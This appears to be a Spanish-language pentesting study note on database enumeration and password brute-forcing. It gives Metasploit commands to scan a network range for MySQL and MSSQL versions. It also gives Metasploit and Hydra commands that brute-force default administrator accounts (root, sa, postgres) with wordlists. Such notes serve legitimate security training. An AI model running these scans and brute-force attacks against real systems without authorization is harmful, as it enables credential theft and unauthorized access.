
-- - 
- Tags: #Enumeration #SQL #DataBase
- -- 

A pesar de que **[[Nmap]]** ya nos da bastante información una vez que terminamos los escaneos. Metasploit nos va a servir para detallar algunas cosas.

## 1. Versión de la Base de datos

### 1. Para MySQL (Puerto 3306)

Este es el módulo estándar. Escanea un rango de IPs y te devuelve la versión y si requiere autenticación.

- **Módulo:** `auxiliary/scanner/mysql/mysql_version`

```bash
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.168.1.0/24  # Tu rango de red
set THREADS 10              # Para que sea más rápido
run
```

### 2. Para Microsoft SQL Server (MSSQL - Puerto 1433)

Este es un "truco" muy útil. MSSQL tiene un servicio de resolución que responde por el puerto **1434 UDP**. Metasploit puede interrogar este puerto para obtener información de todas las instancias de SQL instaladas, incluyendo versiones y nombres de las instancias.

- **Módulo:** `auxiliary/scanner/mssql/mssql_ping`

 ```bash
 use auxiliary/scanner/mssql/mssql_ping 
 set RHOSTS 192.168.1.0/24 
 run
 ```

**Nota:** Este módulo es genial porque a veces el SQL principal no está en el puerto 1433, y este escaneo te dirá en qué puerto "escondido" se encuentra.


## 2. Fuerza Bruta con Metasploit

Si tenemos algún usuario y queremos probar un ataque de **fuerza bruta** para ver si podemos sacar su contraseña, intentamos con: 

```
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```


## 3. Fuerza Bruta con [[hydra]]

### 1. MySQL

MySQL es el caso más común. El puerto por defecto es el **3306**.

```bash
hydra -l root -P /ruta/diccionario.txt 192.168.1.50 mysql
```

- **Usuario común:** `root` es el administrador por defecto.

- **Protocolo:** Aquí simplemente escribes `mysql` al final (o `mysql://IP`).

### 2. MSSQL (SQL Server)

Muy común en entornos Windows. El puerto suele ser el **1433**.

```bash
hydra -l sa -P /ruta/diccionario.txt 192.168.1.50 mssql
```

**Usuario común:** `sa` (System Administrator).

### 3. PostgreSQL

El puerto por defecto es el **5432**.

```bash
hydra -l postgres -P /ruta/diccionario.txt 192.168.1.50 postgres
```

